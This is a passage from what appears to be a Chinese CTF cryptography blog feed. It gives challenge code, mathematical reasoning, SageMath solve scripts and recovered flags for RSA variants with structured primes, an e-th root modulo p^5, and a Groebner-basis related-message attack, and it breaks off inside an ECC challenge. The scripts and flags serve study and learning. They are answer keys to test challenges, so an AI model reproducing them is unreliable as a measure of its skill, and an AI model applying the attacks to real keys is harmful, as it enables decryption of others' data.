class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, isPrime, bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sus</span>(<span class="params">sz, d</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(sz)</span><br><span class="line">        pp = <span class="built_in">sum</span>([p**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(d)])</span><br><span class="line">        <span class="keyword">if</span> isPrime(pp):</span><br><span class="line">            <span class="keyword">return</span> p, pp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = sus(<span class="number">512</span>, <span class="number">3</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span> * <span class="number">3</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip())</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">1125214074953003550338693571791155006090796212726975350140792193817691133917160305053542782925680862373280169090301712046464465620409850385467397784321453675396878680853302837289474127359729865584385059201707775238870232263306676727868754652536541637937452062469058451096996211856806586253080405693761350527787379604466148473842686716964601958192702845072731564672276539223958840687948377362736246683236421110649264777630992389514349446404208015326249112846962181797559349629761850980006919766121844428696162839329082145670839314341690501211334703611464066066160436143122967781441535203415038656670887399283874866947000313980542931425158634358276922283935422468847585940180566157146439137197351555650475378438394062212134921921469936079889107953354092227029819250669352732749370070996858744765757449980454966317942024199049138183043402199967786003097786359894608611331234652313102498596516590920508269648305903583314189707679</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">27126515219921985451218320201366564737456358918573497792847882486241545924393718080635287342203823068993908455514036540227753141033250259348250042460824265354495259080135197893797181975792914836927018186710682244471711855070708553557141164725366015684184788037988219652565179002870519189669615988416860357430127767472945833762628172190228773085208896682176968903038031026206396635685564975604545616032008575709303331751883115339943537730056794403071865003610653521994963115230275035006559472462643936356750299150351321395319301955415098283861947785178475071537482868994223452727527403307442567556712365701010481560424826125138571692894677625407372483041209738234171713326474989489802947311918341152810838321622423351767716922856007838074781678539986694993211304216853828611394630793531337147512240710591162375077547224679647786450310708451590432452046103209161611561606066902404405369379357958777252744114825323084960942810</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>真好题！<br>DAS11月赛也出了个一样的 当时只是套脚本出的flag 完全没理解算法原理<br>最近学校群论也讲了剩余类环 有限域的乘法群&#x2F;元素个数 等内容也学了 再来看 就看得懂了<br>先放出题人的思路:<br><img src="https://s2.loli.net/2023/12/17/Wqow4KuZbeg2RxG.jpg" alt="img"></p><p>下面结合本人粗浅的群论知识来具体阐述一下</p><p>首先根据pp的构造形式很容易联想到 p ^ 3 - 1 这种形式<br>按照出题人的思路(这一步怎么想得到的啊。。。)<br>我们希望能构造一个阶为p^3 - 1的群同时希望是一个循环群<br>生成元为g 那么 o(g)&#x3D;p^3 - 1<br><code>o(g ^ n) = o(g ^ p*(p^2+p+1)*r) = p-1</code><br>想要利用这个性质 接下来产生两个问题:</p><ul><li>如何建立阶为p ^ 3 - 1 的循环群</li><li>怎么利用 o(g ^ n) &#x3D; p-1</li></ul><p>第一个问题在学了域上的多项式后很好解决<br>我们只需要找一个多项式环F[x]上的三次不可约多项式f(x)<br>那么F[x]&#x2F;f(x) 构成一个域F’ 且F’的乘法群阶数为p ^ 3 - 1 且刚好是一个循环群<br>这里的F[x]本来应该取Fp[x]的 但这里我们没有p只能构造modN意义下的Zn[x]<br>记P&#x3D;Fp[x]&#x2F;f(x) N&#x3D;Zn[x]&#x2F;f(x) 这里P是N的子环</p><p>第二个问题 怎么利用这个 o(g ^ n) &#x3D; p-1 呢？<br>从性质出发 o(t)&#x3D;p-1 &#x3D;&gt; t ^ (p-1) &#x3D; 1<br>而由多项式剩余类环性质 deg(g ^ n)&lt;&#x3D;2<br>所以 g ^ n &#x3D; ax ^ 2+bx+c 的形式<br>在P环中看<br>任意c 都有 c ^ (p-1) &#x3D; 1<br>又由阶的幂次公式&#x3D;&gt;阶为p-1的只有φ(p-1)个<br>而 c都有p-1个取值使得o(c)&#x3D;p-1<br>说明 g ^ n 的形式只能为<br><code>0x^2+0x+c</code> !!!!!!!!!!!!!!!!!!!</p><p>那么放到环N中看 就说明二次项和一次项系数都是p的倍数！<br>那么求gcd就有可能得到p!!!!!!!!!!!!!!!!orz orz orz</p><p>脚本就用官方的好了(<del>自己也写不怎么来</del>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">1125214074953003550338693571791155006090796212726975350140792193817691133917160305053542782925680862373280169090301712046464465620409850385467397784321453675396878680853302837289474127359729865584385059201707775238870232263306676727868754652536541637937452062469058451096996211856806586253080405693761350527787379604466148473842686716964601958192702845072731564672276539223958840687948377362736246683236421110649264777630992389514349446404208015326249112846962181797559349629761850980006919766121844428696162839329082145670839314341690501211334703611464066066160436143122967781441535203415038656670887399283874866947000313980542931425158634358276922283935422468847585940180566157146439137197351555650475378438394062212134921921469936079889107953354092227029819250669352732749370070996858744765757449980454966317942024199049138183043402199967786003097786359894608611331234652313102498596516590920508269648305903583314189707679</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">27126515219921985451218320201366564737456358918573497792847882486241545924393718080635287342203823068993908455514036540227753141033250259348250042460824265354495259080135197893797181975792914836927018186710682244471711855070708553557141164725366015684184788037988219652565179002870519189669615988416860357430127767472945833762628172190228773085208896682176968903038031026206396635685564975604545616032008575709303331751883115339943537730056794403071865003610653521994963115230275035006559472462643936356750299150351321395319301955415098283861947785178475071537482868994223452727527403307442567556712365701010481560424826125138571692894677625407372483041209738234171713326474989489802947311918341152810838321622423351767716922856007838074781678539986694993211304216853828611394630793531337147512240710591162375077547224679647786450310708451590432452046103209161611561606066902404405369379357958777252744114825323084960942810</span></span><br><span class="line">k = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R = Zmod(n)[<span class="string">&quot;x&quot;</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Q = R.quo(R.random_element(k))</span><br><span class="line">    pp = gcd(ZZ(<span class="built_in">list</span>(Q.random_element() ^ n)[<span class="number">1</span>]), n)</span><br><span class="line">    <span class="keyword">if</span> pp != <span class="number">1</span>:</span><br><span class="line">        qq = <span class="built_in">sum</span>([pp**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k)])</span><br><span class="line">        rr = n // (pp * qq)</span><br><span class="line">        <span class="keyword">assert</span> n == pp * qq * rr</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">phi = (pp - <span class="number">1</span>) * (qq - <span class="number">1</span>) * (rr - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># ictf&#123;idk_if_it_solvable_if_q_is_2+p+p^2_instead&#125;</span></span><br></pre></td></tr></table></figure><hr><hr><p>写的时候发现有些知识掌握的还不是很清楚<del>期末复习得加油了</del></p><h1 id="强网杯2023"><a href="#强网杯2023" class="headerlink" title="强网杯2023"></a>强网杯2023</h1><h2 id="not-only-rsa"><a href="#not-only-rsa" class="headerlink" title="not_only_rsa"></a>not_only_rsa</h2><p>n分解为p^5 发现gcd(e,phi)&#x3D;e<br>那么只能硬开根<br>遇到这种只能硬开的才发现自己以前的脚本好low… 跑半天没跑出来<br><a href="https://tover.xyz/p/n-root-in-F/">这篇</a>总结了常用的几个有限域开方模板<br>直接套都能出<br>这里要将product那里稍微改一改 不然会和itertools的混淆?<br>直接套 nthRSA_p:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage10</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> not work for gcd(e//r, phi) \ne 1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root1</span>(<span class="params">n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  F = Zmod(p^k)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line">  <span class="keyword">assert</span> phi % n == <span class="number">0</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    g = F.random_element()</span><br><span class="line">    u0 = Integer(<span class="built_in">pow</span>(g, phi//n, P))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(u0, n, P) == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> u0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_prime(p)</span><br><span class="line">  F = Zmod(p^k)</span><br><span class="line">  x0 = F(y).nth_root(n)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    u0 = F(<span class="number">1</span>).nth_root(n) </span><br><span class="line">  <span class="keyword">except</span>: <span class="comment"># if NotImplementedError...</span></span><br><span class="line">    u0 = root1(n, p, k)</span><br><span class="line">  x = []</span><br><span class="line">  u = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    u += [u0^(i+<span class="number">1</span>)]</span><br><span class="line">    x += [Integer(x0 * u[i])]</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nthRSA_p</span>(<span class="params">c, e, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_prime(p)</span><br><span class="line">  P = Integer(<span class="built_in">pow</span>(p, k))</span><br><span class="line">  phi = euler_phi(P)</span><br><span class="line"></span><br><span class="line">  rs = []</span><br><span class="line">  ei = e</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = gcd(phi, ei)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    rs += [r]</span><br><span class="line">    ei //= r</span><br><span class="line"><span class="comment">#   r = product(rs)</span></span><br><span class="line">  r = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> rs:</span><br><span class="line">    r *= x</span><br><span class="line">  dr = (e // r).inverse_mod(phi)</span><br><span class="line">  cr = <span class="built_in">pow</span>(c, dr, P)</span><br><span class="line">  <span class="keyword">return</span> nth_p(cr, r, p, k)</span><br><span class="line"></span><br><span class="line">n = <span class="number">6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849</span></span><br><span class="line">e = <span class="number">641747</span></span><br><span class="line">c = <span class="number">730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943</span></span><br><span class="line">p = <span class="number">91027438112295439314606669837102361953591324472804851543344131406676387779969</span></span><br><span class="line"><span class="keyword">assert</span> n == p^<span class="number">5</span></span><br><span class="line">res = nthRSA_p(c, e, p, <span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">    flag = libnum.n2s(<span class="built_in">int</span>(x))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;c19c3ec0-d489-4bbb-83fc-bc0419a6822a&#125;</span></span><br></pre></td></tr></table></figure><p>本地跑17.682381629943848秒就能出</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Groebner基</title>
      <link href="/Groebner%E5%9F%BA/"/>
      <url>/Groebner%E5%9F%BA/</url>
      
        <content type="html"><![CDATA[<p>目前还完全理解不了原理 先记录一些与Groebner基有关的题目</p><span id="more"></span><h1 id="Learn"><a href="#Learn" class="headerlink" title="Learn"></a>Learn</h1><p><a href="https://www.zhihu.com/question/24452817">Goebner Zhihu</a></p><p><a href="https://mystiz.hk/posts/2021/2021-02-15-dicectf-1/#benaloh">https://mystiz.hk/posts/2021/2021-02-15-dicectf-1/#benaloh</a></p><p><a href="https://dexterjie.github.io/2023/07/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/LitCTF/?highlight=groebner#babyLCG">LCG恢复系数</a></p><p><a href="http://www.scholarpedia.org/article/Groebner_basis">Groebner basis - Scholarpedia</a></p><p><a href="https://zhuanlan.zhihu.com/p/363648238">最后一题 比较详细分析了Grobner基</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2019红帽杯related"><a href="#2019红帽杯related" class="headerlink" title="2019红帽杯related"></a>2019红帽杯related</h2><p>题目给定</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n</span><br><span class="line">s = s0+s1+s2</span><br><span class="line">c0 = s0^<span class="number">17</span> (mod n)</span><br><span class="line">c1 = s1^<span class="number">17</span> (mod n)</span><br><span class="line">c2 = s2^<span class="number">17</span> (mod n)</span><br><span class="line">c3 = s3^<span class="number">17</span> (mod n)</span><br><span class="line">s3 = <span class="number">65537</span>*s0 - <span class="number">66666</span>*s1 + <span class="number">12345</span>*s2</span><br></pre></td></tr></table></figure><p>求s0,s1,s2</p><p>题目大致可以看成一种相关消息攻击的变形 wiki提供了以下方法</p><p><img src="https://s2.loli.net/2023/12/04/arkovT57ScK42Zj.png" alt="img"></p><p>sage打印一下中间求得的groebner基 是这种形式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[x + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span>, y + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span>, z + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649</span></span><br><span class="line">s = <span class="number">280513550110197745829890567436265496990</span></span><br><span class="line">c1 = <span class="number">10607235400098586699994392584841806592000660816191315008947917773605476365884572056544621466807636237415893192966935651590312237598366247520986667580174438232591692369894702423377081613821241343307094343575042030793564118302488401888197517625333923710172738913771484628557310164974384462856047065486913046647133386246976457961265115349103039946802386897315176633274295410371986422039106745216230401123542863714301114753239888820442112538285194875243192862692290859625788686421276234445677411280606266052059579743874849594812733193363406594409214632722438592376518310171297234081555028727538951934761726878443311071990</span></span><br><span class="line">c2 = <span class="number">2665348075952836665455323350891842781938471372943896177948046901127648217780657532963063228780230203325378931053293617434754585479452556620021360669764370971665619743473463613391689402725053682169256850873752706252379747752552015341379702582040497607180172854652311649467878714425698676142212588380080361100526614423533767196749274741380258842904968147508033091819979042560336703564128279527380969385330845759998657540777339113519036552454829323666242269607225156846084705957131127720351868483375138773025602253783595007177712673092409157674720974653789039702431795168654387038080256838321255342848782705785524911705</span></span><br><span class="line">c3 = <span class="number">4881225713895414151830685259288740981424662400248897086365166643853409947818654509692299250960938511400178276416929668757746679501254041354795468626916196040017280791985239849062273782179873724736552198083211250561192059448730545500442981534768431023858984817288359193663144417753847196868565476919041282010484259630583394963580424358743754334956833598351424515229883148081492471874232555456362089023976929766530371320876651940855297249474438564801349160584279330339012464716197806221216765180154233949297999618011342678854874769762792918534509941727751433687189532019000334342211838299512315478903418642056097679717</span></span><br><span class="line"></span><br><span class="line">R.&lt;x,y,z&gt; = Zmod(n)[]</span><br><span class="line">I = ideal(x+y+z-s,x^<span class="number">17</span>-c1,y^<span class="number">17</span>-c2,z^<span class="number">17</span>-c3)</span><br><span class="line">res = I.groebner_basis()</span><br><span class="line">m1 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span></span><br><span class="line">m2 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span></span><br><span class="line">m3 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span></span><br><span class="line"></span><br><span class="line">m1 = m1%n</span><br><span class="line">m2 = m2%n</span><br><span class="line">m3 = m3%n</span><br><span class="line"></span><br><span class="line">m = (m3&lt;&lt;<span class="number">256</span>)+(m2&lt;&lt;<span class="number">128</span>)+m1</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;bf684fc7-5398-4bf3-ad5f-cfe3dc53a202&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure><p>先记着吧 完全没搞懂groebner基的神奇作用</p><h2 id="DASCTF-Apr-2023-ECC"><a href="#DASCTF-Apr-2023-ECC" class="headerlink" title="DASCTF Apr.2023 ECC"></a>DASCTF Apr.2023 ECC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q, a, b, e1, e2, e3</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;DASCTF&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, p, q, e</span>):</span><br><span class="line">        self.p, self.q = p, q</span><br><span class="line">        self.a, self.b = a, b</span><br><span class="line">        self.N         = p * q</span><br><span class="line">        self.e         = e</span><br><span class="line">        self.Kbits     = <span class="number">8</span></span><br><span class="line">        self.Ep        = EllipticCurve(IntegerModRing(p), [a, b])</span><br><span class="line">        self.Eq        = EllipticCurve(IntegerModRing(q), [a, b])</span><br><span class="line"></span><br><span class="line">        N1 = self.Ep.order()</span><br><span class="line">        N2 = <span class="number">2</span> * p + <span class="number">2</span> - N1</span><br><span class="line">        N3 = self.Eq.order()</span><br><span class="line">        N4 = <span class="number">2</span> * q + <span class="number">2</span> - N3</span><br><span class="line"></span><br><span class="line">        self.d = &#123;</span><br><span class="line">            ( <span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N1, N3)),</span><br><span class="line">            ( <span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N1, N4)),</span><br><span class="line">            (-<span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N2, N3)),</span><br><span class="line">            (-<span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N2, N4))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self.E = EllipticCurve(IntegerModRing(self.N), [a, b])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        msg_point = self.msg_to_point(plaintext, <span class="literal">True</span>)</span><br><span class="line">        mp = self.Ep(msg_point)</span><br><span class="line">        mq = self.Eq(msg_point)</span><br><span class="line">        cp = (self.e * mp).xy()</span><br><span class="line">        cq = (self.e * mq).xy()</span><br><span class="line">        cp = (<span class="built_in">int</span>(cp[<span class="number">0</span>]), <span class="built_in">int</span>(cp[<span class="number">1</span>]))</span><br><span class="line">        cq = (<span class="built_in">int</span>(cq[<span class="number">0</span>]), <span class="built_in">int</span>(cq[<span class="number">1</span>]))</span><br><span class="line">        c  = (<span class="built_in">int</span>(crt([cp[<span class="number">0</span>], cq[<span class="number">0</span>]], [self.p, self.q])), \</span><br><span class="line">              <span class="built_in">int</span>(crt([cp[<span class="number">1</span>], cq[<span class="number">1</span>]], [self.p, self.q])))</span><br><span class="line">        c = self.E(c)</span><br><span class="line">        <span class="keyword">return</span> c.xy()</span><br><span 